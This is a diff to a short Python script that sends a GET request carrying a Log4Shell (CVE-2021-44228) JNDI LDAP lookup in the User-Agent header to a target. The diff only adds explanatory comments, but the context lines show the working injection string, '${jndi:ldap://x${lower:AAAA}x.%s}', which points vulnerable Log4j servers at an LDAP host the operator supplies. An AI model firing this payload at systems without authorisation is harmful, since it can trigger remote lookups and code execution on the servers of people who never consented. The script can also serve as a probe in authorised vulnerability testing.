@@ -1,6 +1,13 @@
 #!/usr/bin/env python3
 
-# Sends GET request to target and tries to exploit Log4Shell by including LDAP lookup in User-Agent HTTP header
+# CVE-2021-44228
+# Sends GET request to target and tries to exploit Log4Shell
+# by including LDAP lookup in User-Agent header
+
+# Requires a LDAP server or an OOB detection tool to verify
+# that the exploit is working
+
+# Usage: ./log4shell.py [ldap_url]
 
 import requests
 import argparse
@@ -14,6 +21,8 @@ args = parser.parse_args()
 
 # Using ${lower} to prevent false positives
 # (e.g. by DNS lookups not caused by Log4Shell)
+# 'xaaax' is just an arbitrary pattern you can look for
+# to verify that Log4Shell is exploited
 user_agent = "${jndi:ldap://x${lower:AAAA}x.%s}" % args.ldap_url 
 
 headers = {
